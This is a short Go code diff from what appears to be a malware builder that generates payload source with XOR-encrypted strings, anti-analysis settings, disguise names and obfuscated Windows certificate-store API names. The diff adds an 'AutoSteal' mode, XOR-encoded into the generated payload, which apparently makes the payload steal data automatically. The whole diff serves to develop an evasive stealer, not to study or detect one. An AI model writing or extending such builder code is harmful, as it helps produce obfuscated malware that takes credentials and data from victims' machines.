@@ -154,6 +154,7 @@ type globalValues struct {
 	AntiAnalysisMode    string
 	OfflineMode         bool
 	XorKeyLiteral       string
+	EncAutoStealMode    string
 }
 
 var disguiseNames = []string{
@@ -426,6 +427,7 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		AntiAnalysisMode:  strings.TrimSpace(cfg.AntiAnalysis),
 		OfflineMode:       cfg.OfflineMode,
 		XorKeyLiteral:     escapeGoString(key),
+		EncAutoStealMode:  xorWithKey(strings.TrimSpace(cfg.AutoSteal), key),
 	}, nil
 }
 
@@ -593,6 +595,7 @@ var encCertEnumCertsName = "%s"
 var encCertGetNameStringWName = "%s"
 var encCertFreeCertCtxName = "%s"
 var encCertCloseStoreName = "%s"
+var encAutoStealMode = "%s"
 
 var decryptionKey = []byte("%s")
 `,
@@ -742,6 +745,7 @@ var decryptionKey = []byte("%s")
 		g.EncCertGetNameStringW,
 		g.EncCertFreeCertCtx,
 		g.EncCertCloseStore,
+		g.EncAutoStealMode,
 		g.XorKeyLiteral,
 	)), nil
 }
